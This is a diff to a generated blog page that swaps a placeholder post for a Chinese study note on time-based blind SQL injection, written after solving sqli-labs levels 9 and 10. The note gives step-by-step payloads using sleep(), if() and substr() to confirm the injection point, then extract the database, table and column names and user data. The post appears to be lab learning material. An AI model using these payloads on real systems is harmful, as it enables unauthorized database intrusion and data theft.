@@ -73,8 +73,8 @@
   
     <article id="post-my-blogneirong" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2023/04/10/my-blogneirong/" class="article-date">
-  <time class="dt-published" datetime="2023-04-10T12:26:29.000Z" itemprop="datePublished">2023-04-10</time>
+    <a href="/2023/04/15/my-blogneirong/" class="article-date">
+  <time class="dt-published" datetime="2023-04-14T16:00:00.000Z" itemprop="datePublished">2023-04-15</time>
 </a>
     
   </div>
@@ -85,7 +85,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/04/10/my-blogneirong/">7</a>
+      <a class="p-name article-title" href="/2023/04/15/my-blogneirong/">时间盲注</a>
     </h1>
   
 
@@ -93,11 +93,19 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="welcome-to-my-blog"><a href="#welcome-to-my-blog" class="headerlink" title="welcome to my blog"></a>welcome to my blog</h1><h2 id="这是二级标题"><a href="#这是二级标题" class="headerlink" title="这是二级标题"></a>这是二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3>
+        <p>在通关sqllabs第9关与第10关时我们知道了时间盲注这一概念，<br>用时间盲注来判断注入点是否正确，使用sleep延迟函数。<br>if()函数				条件判断函数<br>if(a,b,c)	   if判断句，a为条件，b、c为执行语句；如果a为真就执行b，a为假就执行c;<br>sleep()函数			网页延迟n秒后，输出结果<br>left（）函数             从左边数，取几个数<br>例如：left（abcdef，3）  取3位左边的数，就是abc  </p>
+<ol>
+<li>判断注入点：?id&#x3D;1 and sleep(10)–+ 如若页面加载则判断正确，否则尝试其他</li>
+<li>爆库：?id&#x3D;1’ and if (length(database()) &#x3D; 8 ,sleep(4),1)–+ 如若延时则正确，?id&#x3D;1’ and If((substr(database(),1,1)&#x3D;’s’),sleep(5),1)–+ 挨个尝试找出八个字符库名security</li>
+<li>爆表名：?id&#x3D;1’ and If((substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),1,1))&#x3D;‘u‘,sleep(4),1)–+ 等于users</li>
+<li>爆字段：?id&#x3D;1’ and If(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database() limit 0,1),1,1))&#x3D;105,sleep(4),1)–+</li>
+<li>爆数据：?id&#x3D;1’ and If( (substr((select username from users limit 0,1),1,1))&#x3D;’a’,sleep(4),1)–+</li>
+</ol>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2023/04/10/my-blogneirong/" data-id="clgi1lkqm000094v56gsjfbjd" data-title="7" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2023/04/15/my-blogneirong/" data-id="clgi1lkqm000094v56gsjfbjd" data-title="时间盲注" class="article-share-link">Share</a>
       
       
       
@@ -191,7 +199,7 @@
       <ul>
         
           <li>
-            <a href="/2023/04/10/my-blogneirong/">7</a>
+            <a href="/2023/04/15/my-blogneirong/">时间盲注</a>
           </li>
         
           <li>
